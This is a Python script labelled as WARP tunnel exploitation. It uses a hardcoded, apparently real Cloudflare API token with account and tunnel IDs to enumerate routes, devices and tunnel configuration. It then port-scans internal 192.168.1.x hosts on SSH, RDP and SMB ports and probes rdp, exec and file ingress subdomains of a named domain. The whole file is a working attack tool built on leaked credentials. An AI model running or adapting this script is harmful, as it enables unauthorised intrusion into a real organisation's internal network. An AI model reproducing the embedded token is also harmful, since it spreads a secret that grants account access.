import socket
import struct
import time
import urllib.request
import json

CF_TOKEN = "ySIb_2uMzHQDvnK5MulcCvOiRKsC6k0pH188bG8Y"
ACCOUNT_ID = "4c2932bc3381be38d5266241b16be092"
TUNNEL_ID = "926eac5e-2642-4a16-9edc-c06b6c705ab8"

print("=== WARP DIRECT ACCESS EXPLOITATION ===\n")

print("[1] Getting tunnel virtual network info...")
headers = {"Authorization": f"Bearer {CF_TOKEN}", "Content-Type": "application/json"}

endpoints_to_check = [
    f"https://api.cloudflare.com/client/v4/accounts/{ACCOUNT_ID}/teamnet/routes",
    f"https://api.cloudflare.com/client/v4/accounts/{ACCOUNT_ID}/teamnet/virtual_networks",
    f"https://api.cloudflare.com/client/v4/accounts/{ACCOUNT_ID}/devices",
]

for url in endpoints_to_check:
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read())
            if data.get("success") and data.get("result"):
                print(f"\n[+] {url.split('/')[-1]}:")
                result = data["result"]
                if isinstance(result, list):
                    for item in result[:5]:
                        print(f"    - {item}")
                else:
                    print(f"    {json.dumps(result, indent=4)[:500]}")
    except Exception as e:
        print(f"[-] {url.split('/')[-1]}: {e}")

print("\n[2] Checking WARP routing configuration...")
try:
    req = urllib.request.Request(
        f"https://api.cloudflare.com/client/v4/accounts/{ACCOUNT_ID}/cfd_tunnel/{TUNNEL_ID}/configurations",
        headers=headers
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        data = json.loads(resp.read())
        if data.get("success"):
            config = data["result"]["config"]
            print(f"    WARP routing: {config.get('warp-routing', {})}")
            print(f"    Ingress rules: {len(config.get('ingress', []))}")
except Exception as e:
    print(f"    Error: {e}")

print("\n[3] Attempting direct connection to 192.168.1.x via WARP tunnel...")
target_ips = ["192.168.1.1", "192.168.1.104", "192.168.1.254"]
ports = [22, 80, 443, 3389, 445, 8080]

for ip in target_ips:
    print(f"\n    Scanning {ip}:")
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            if result == 0:
                print(f"      [+] {ip}:{port} OPEN")
            sock.close()
        except Exception as e:
            pass

print("\n[4] Testing tunnel ingress endpoints...")
test_urls = [
    "https://rdp.ai-smith.net",
    "https://exec.ai-smith.net",
    "https://file.ai-smith.net",
]
for url in test_urls:
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            print(f"    [+] {url}: {resp.status}")
    except urllib.error.HTTPError as e:
        print(f"    [-] {url}: HTTP {e.code}")
    except Exception as e:
        print(f"    [-] {url}: {e}")
